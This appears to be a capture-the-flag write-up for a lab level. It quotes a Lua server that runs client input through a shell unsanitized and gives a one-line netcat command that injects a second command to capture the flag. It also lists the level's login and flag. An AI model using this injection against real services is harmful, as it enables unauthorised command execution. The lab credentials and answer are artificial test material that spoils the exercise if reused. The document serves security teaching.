username: level11  
password: feulo4b72j7edeahuete3no7c
---

`level11.lua` started a server on port 5151

It receives a Password from the client and generates its `sha1sum` using the system shell

```lua
...
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
...
```

The input is unsanitized which leads to command execution.

To get the flag run the following

```
echo '; getflag>/tmp/a;#' | nc 127.0.0.1 5151 && cat /tmp/a
```

The flag is: fa6v5ateaw21peobuub8ipe6s
